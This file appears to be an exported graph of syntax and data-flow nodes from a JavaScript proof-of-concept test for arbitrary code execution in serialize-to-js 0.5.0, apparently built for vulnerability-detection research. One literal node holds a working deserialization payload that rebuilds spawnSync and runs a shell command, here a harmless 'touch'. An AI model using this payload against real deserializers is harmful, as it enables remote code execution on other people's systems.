Id:ID¿Type¿SubType¿FunctionContext¿IdentifierName¿Raw¿InternalStructure¿Location¿Code¿Label:LABEL
149¿Identifier¿¿235¿require¿¿¿{"start":{"line":3,"column":13},"end":{"line":3,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
150¿Literal¿string¿235¿¿'fs'¿¿{"start":{"line":3,"column":21},"end":{"line":3,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Literal
151¿VariableDeclarator¿¿235¿serialize¿¿¿{"start":{"line":4,"column":8},"end":{"line":4,"column":46},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
152¿CallExpression¿¿235¿¿¿¿{"start":{"line":4,"column":20},"end":{"line":4,"column":46},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
153¿Identifier¿¿235¿require¿¿¿{"start":{"line":4,"column":20},"end":{"line":4,"column":27},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
154¿Literal¿string¿235¿¿'serialize-to-js'¿¿{"start":{"line":4,"column":28},"end":{"line":4,"column":45},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Literal
155¿VariableDeclarator¿¿235¿path¿¿¿{"start":{"line":5,"column":8},"end":{"line":5,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
156¿Literal¿string¿235¿¿'./serialize-to-js'¿¿{"start":{"line":5,"column":15},"end":{"line":5,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Literal
157¿VariableDeclarator¿¿235¿payload¿¿¿{"start":{"line":6,"column":6},"end":{"line":7,"column":1423},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
158¿Literal¿string¿235¿¿'{e: (function(){ spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`serialize-to-js`]));})() }'¿¿{"start":{"line":7,"column":4},"end":{"line":7,"column":1423},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Literal
159¿ExpressionStatement¿¿235¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿ExpressionStatement
160¿AssignmentExpression¿=¿235¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿AssignmentExpression
161¿Identifier¿¿235¿file_exist¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":12},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
162¿CallExpression¿¿235¿¿¿¿{"start":{"line":8,"column":15},"end":{"line":8,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
163¿MemberExpression¿¿235¿¿¿¿{"start":{"line":8,"column":15},"end":{"line":8,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿MemberExpression
164¿Identifier¿¿235¿fs¿¿¿{"start":{"line":8,"column":15},"end":{"line":8,"column":17},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
165¿Identifier¿¿235¿existsSync¿¿¿{"start":{"line":8,"column":18},"end":{"line":8,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
166¿Identifier¿¿235¿path¿¿¿{"start":{"line":8,"column":29},"end":{"line":8,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
167¿VariableDeclarator¿¿235¿v12¿¿¿{"start":{"line":9,"column":2},"end":{"line":9,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
168¿CallExpression¿¿235¿¿¿¿{"start":{"line":9,"column":2},"end":{"line":9,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
169¿Identifier¿¿235¿expect¿¿¿{"start":{"line":9,"column":2},"end":{"line":9,"column":8},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
170¿Identifier¿¿235¿file_exist¿¿¿{"start":{"line":9,"column":9},"end":{"line":9,"column":19},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
171¿VariableDeclarator¿¿235¿v13¿¿¿{"start":{"line":9,"column":2},"end":{"line":9,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
172¿CallExpression¿¿235¿¿¿¿{"start":{"line":9,"column":2},"end":{"line":9,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
173¿MemberExpression¿¿235¿¿¿¿{"start":{"line":9,"column":2},"end":{"line":9,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿MemberExpression
174¿Identifier¿¿235¿v12¿¿¿¿¿Identifier
175¿Identifier¿¿235¿toBe¿¿¿{"start":{"line":9,"column":21},"end":{"line":9,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
176¿Literal¿boolean¿235¿¿false¿¿{"start":{"line":9,"column":26},"end":{"line":9,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Literal
177¿ExpressionStatement¿¿235¿¿¿¿{"start":{"line":9,"column":2},"end":{"line":9,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿ExpressionStatement
178¿Identifier¿¿235¿v13¿¿¿¿¿Identifier
179¿TryStatement¿¿235¿¿¿¿{"start":{"line":10,"column":2},"end":{"line":12,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿TryStatement
180¿VariableDeclarator¿¿235¿v14¿¿¿{"start":{"line":11,"column":4},"end":{"line":11,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
181¿CallExpression¿¿235¿¿¿¿{"start":{"line":11,"column":4},"end":{"line":11,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
182¿MemberExpression¿¿235¿¿¿¿{"start":{"line":11,"column":4},"end":{"line":11,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿MemberExpression
183¿Identifier¿¿235¿serialize¿¿¿{"start":{"line":11,"column":4},"end":{"line":11,"column":13},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
184¿Identifier¿¿235¿deserialize¿¿¿{"start":{"line":11,"column":14},"end":{"line":11,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
185¿Identifier¿¿235¿payload¿¿¿{"start":{"line":11,"column":26},"end":{"line":11,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
186¿ExpressionStatement¿¿235¿¿¿¿{"start":{"line":11,"column":4},"end":{"line":11,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿ExpressionStatement
187¿Identifier¿¿235¿v14¿¿¿¿¿Identifier
188¿BlockStatement¿¿235¿¿¿¿{"start":{"line":10,"column":6},"end":{"line":12,"column":3},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿BlockStatement
189¿CatchClause¿¿235¿¿¿¿{"start":{"line":12,"column":4},"end":{"line":12,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CatchClause
190¿BlockStatement¿¿235¿¿¿¿{"start":{"line":12,"column":18},"end":{"line":12,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿BlockStatement
191¿Identifier¿¿235¿error¿¿¿{"start":{"line":12,"column":11},"end":{"line":12,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
192¿ExpressionStatement¿¿235¿¿¿¿{"start":{"line":13,"column":2},"end":{"line":13,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿ExpressionStatement
193¿AssignmentExpression¿=¿235¿¿¿¿{"start":{"line":13,"column":2},"end":{"line":13,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿AssignmentExpression
194¿Identifier¿¿235¿file_exist¿¿¿{"start":{"line":13,"column":2},"end":{"line":13,"column":12},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
195¿CallExpression¿¿235¿¿¿¿{"start":{"line":13,"column":15},"end":{"line":13,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
196¿MemberExpression¿¿235¿¿¿¿{"start":{"line":13,"column":15},"end":{"line":13,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿MemberExpression
197¿Identifier¿¿235¿fs¿¿¿{"start":{"line":13,"column":15},"end":{"line":13,"column":17},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
198¿Identifier¿¿235¿existsSync¿¿¿{"start":{"line":13,"column":18},"end":{"line":13,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
199¿Identifier¿¿235¿path¿¿¿{"start":{"line":13,"column":29},"end":{"line":13,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
200¿VariableDeclarator¿¿235¿v15¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
201¿CallExpression¿¿235¿¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
202¿Identifier¿¿235¿expect¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":8},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
203¿Identifier¿¿235¿file_exist¿¿¿{"start":{"line":14,"column":9},"end":{"line":14,"column":19},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
204¿VariableDeclarator¿¿235¿v16¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
205¿CallExpression¿¿235¿¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
206¿MemberExpression¿¿235¿¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿MemberExpression
207¿Identifier¿¿235¿v15¿¿¿¿¿Identifier
208¿Identifier¿¿235¿toBe¿¿¿{"start":{"line":14,"column":21},"end":{"line":14,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
209¿Literal¿boolean¿235¿¿true¿¿{"start":{"line":14,"column":26},"end":{"line":14,"column":30},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Literal
210¿ExpressionStatement¿¿235¿¿¿¿{"start":{"line":14,"column":2},"end":{"line":14,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿ExpressionStatement
211¿Identifier¿¿235¿v16¿¿¿¿¿Identifier
212¿VariableDeclarator¿¿235¿v17¿¿¿{"start":{"line":15,"column":18},"end":{"line":15,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
213¿FunctionExpression¿¿235¿anon¿¿¿{"start":{"line":15,"column":18},"end":{"line":15,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿FunctionExpression
214¿Identifier¿¿0¿err¿¿¿{"start":{"line":15,"column":28},"end":{"line":15,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
215¿BlockStatement¿¿238¿¿¿¿{"start":{"line":15,"column":33},"end":{"line":15,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿BlockStatement
216¿VariableDeclarator¿¿235¿v18¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":36},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
217¿CallExpression¿¿235¿¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":36},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
218¿MemberExpression¿¿235¿¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":11},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿MemberExpression
219¿Identifier¿¿235¿fs¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":4},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
220¿Identifier¿¿235¿unlink¿¿¿{"start":{"line":15,"column":5},"end":{"line":15,"column":11},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
221¿Identifier¿¿235¿path¿¿¿{"start":{"line":15,"column":12},"end":{"line":15,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
222¿Identifier¿¿235¿v17¿¿¿¿¿Identifier
223¿ExpressionStatement¿¿235¿¿¿¿{"start":{"line":15,"column":2},"end":{"line":15,"column":37},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿ExpressionStatement
224¿Identifier¿¿235¿v18¿¿¿¿¿Identifier
225¿BlockStatement¿¿235¿¿¿¿{"start":{"line":1,"column":58},"end":{"line":16,"column":1},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿BlockStatement
226¿VariableDeclarator¿¿233¿v20¿¿¿{"start":{"line":1,"column":0},"end":{"line":16,"column":2},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿VariableDeclarator
227¿CallExpression¿¿233¿¿¿¿{"start":{"line":1,"column":0},"end":{"line":16,"column":2},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿CallExpression
228¿Identifier¿¿233¿test¿¿¿{"start":{"line":1,"column":0},"end":{"line":1,"column":4},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Identifier
229¿Literal¿string¿233¿¿'Arbitrary code execution in serialize-to-js'¿¿{"start":{"line":1,"column":5},"end":{"line":1,"column":50},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿Literal
230¿Identifier¿¿233¿v19¿¿¿¿¿Identifier
231¿ExpressionStatement¿¿233¿¿¿¿{"start":{"line":1,"column":0},"end":{"line":16,"column":3},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/serialize-to-js_0.5.0/serialize-to-js.test.js"}¿¿ExpressionStatement
232¿Identifier¿¿233¿v20¿¿¿¿¿Identifier
233¿CFG_F_START¿¿233¿__main__¿¿¿¿¿CFG_F_START
234¿CFG_F_END¿¿0¿__main__¿¿¿¿¿CFG_F_END
235¿CFG_F_START¿¿235¿138_anon¿¿¿¿¿CFG_F_START
236¿CFG_F_END¿¿0¿138_anon¿¿¿¿¿CFG_F_END
237¿CFG_TRY_STMT_END¿¿0¿¿¿¿¿¿CFG_TRY_STMT_END
238¿CFG_F_START¿¿238¿213_anon¿¿¿¿¿CFG_F_START
239¿CFG_F_END¿¿0¿213_anon¿¿¿¿¿CFG_F_END
240¿TAINT_SOURCE¿¿0¿TAINT_SOURCE¿¿¿¿¿TAINT_SOURCE
241¿PDG_OBJECT¿¿0¿235.this-o30¿¿¿¿¿PDG_OBJECT
242¿PDG_OBJECT¿¿0¿233.v19-o31¿¿¿¿¿PDG_OBJECT
243¿PDG_CALL¿¿233¿233.CALL->test-o32¿¿¿¿¿PDG_CALL
244¿PDG_OBJECT¿¿0¿233.v20-o33¿¿¿¿¿PDG_OBJECT
245¿PDG_CALL¿¿235¿235.CALL->expect.assertions-o34¿¿¿¿¿PDG_CALL
246¿PDG_OBJECT¿¿0¿235.v11-o35¿¿¿¿¿PDG_OBJECT
247¿PDG_CALL¿¿235¿235.CALL->require-o36¿¿¿¿¿PDG_CALL
248¿PDG_OBJECT¿¿0¿235.fs-o37¿¿¿¿¿PDG_OBJECT
249¿TAINT_SINK¿¿0¿require¿¿¿¿¿TAINT_SINK
250¿PDG_CALL¿¿235¿235.CALL->require-o38¿¿¿¿¿PDG_CALL
251¿PDG_OBJECT¿¿0¿235.serialize-o39¿¿¿¿¿PDG_OBJECT
252¿TAINT_SINK¿¿0¿require¿¿¿¿¿TAINT_SINK
253¿PDG_CALL¿¿235¿235.CALL->fs.existsSync-o40¿¿¿¿¿PDG_CALL
254¿PDG_OBJECT¿¿0¿235.file_exist-o41¿¿¿¿¿PDG_OBJECT
255¿PDG_CALL¿¿235¿235.CALL->expect-o42¿¿¿¿¿PDG_CALL
256¿PDG_OBJECT¿¿0¿235.v12-o43¿¿¿¿¿PDG_OBJECT
257¿PDG_CALL¿¿235¿235.CALL->v12.toBe-o44¿¿¿¿¿PDG_CALL
258¿PDG_OBJECT¿¿0¿235.v13-o45¿¿¿¿¿PDG_OBJECT
259¿PDG_CALL¿¿235¿235.CALL->serialize.deserialize-o46¿¿¿¿¿PDG_CALL
260¿PDG_OBJECT¿¿0¿235.v14-o47¿¿¿¿¿PDG_OBJECT
261¿PDG_CALL¿¿235¿235.CALL->fs.existsSync-o48¿¿¿¿¿PDG_CALL
262¿PDG_OBJECT¿¿0¿235.file_exist-o49¿¿¿¿¿PDG_OBJECT
263¿PDG_CALL¿¿235¿235.CALL->expect-o50¿¿¿¿¿PDG_CALL
264¿PDG_OBJECT¿¿0¿235.v15-o51¿¿¿¿¿PDG_OBJECT
265¿PDG_CALL¿¿235¿235.CALL->v15.toBe-o52¿¿¿¿¿PDG_CALL
266¿PDG_OBJECT¿¿0¿235.v16-o53¿¿¿¿¿PDG_OBJECT
267¿PDG_OBJECT¿¿0¿238.this-o54¿¿¿¿¿PDG_OBJECT
268¿PDG_OBJECT¿¿0¿238.err-o55¿¿¿¿¿PDG_OBJECT
269¿PDG_OBJECT¿¿0¿235.v17-o56¿¿¿¿¿PDG_OBJECT
270¿PDG_CALL¿¿235¿235.CALL->fs.unlink-o57¿¿¿¿¿PDG_CALL
271¿PDG_OBJECT¿¿0¿235.v18-o58¿¿¿¿¿PDG_OBJECT
